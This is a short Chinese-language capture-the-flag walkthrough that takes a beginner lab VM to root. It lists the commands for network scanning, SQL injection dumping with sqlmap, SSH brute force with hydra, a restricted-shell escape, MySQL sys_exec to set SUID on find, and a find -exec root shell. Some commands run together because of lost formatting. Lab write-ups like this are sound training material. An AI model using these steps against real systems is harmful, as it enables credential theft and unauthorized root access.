虚拟机简介：获取远程系统root权限

目标：1个flag

级别：初级

1、主机探测

netdiscover -r 192.168.207.0/24

2、服务探测

nmap -A -sS -sV -v -p- 192.168.207.147
查看开放端口为22、80、139、445

3、WEB渗透测试

3.1 使用Burp进行扫描探测发现SQL注入

3.2 保存请求信息，使用sqlmap进行爆破

sqlmap -r request.txt --dbs

3.3 检测members数据库中的表

sqlmap -r request.txt -D members --tables

3.4 检测members表中的列信息

sqlmap -r request.txt -D members -T members --columns

3.5 获取用户名和密码信息

sqlmap -r request.txt -D members -T members -C username,password --dump

3.6 登录页面后无有用信息

保存账号和密码，并测试SSH登录，均可以登录成功

hydra -L username.txt -P password.txt ssh://192.168.207.147

3.7 使用kali进行连接时无法连接，使用xshell连接成功

3.8 查看是一个限制的shell，查看有echo命令

使用echo进行shell逃逸

echo os.system('/bin/bash')

3.9 使用sudo -l无法成功，无gcc环境进行提权

进入/var/www目录中查看checklogin.php中查看mysql的root密码为空

3.10 进入mysql数据库，给find添加suid权限

mysql -u root -pSELECT sys_exec('chmod u+s /usr/bin/find');

4、系统提权

4.1 进入/tmp目录，创建文件并通过find进行提权

cd /tmptouch hackerfind hacker -exec "/bin/sh" \;
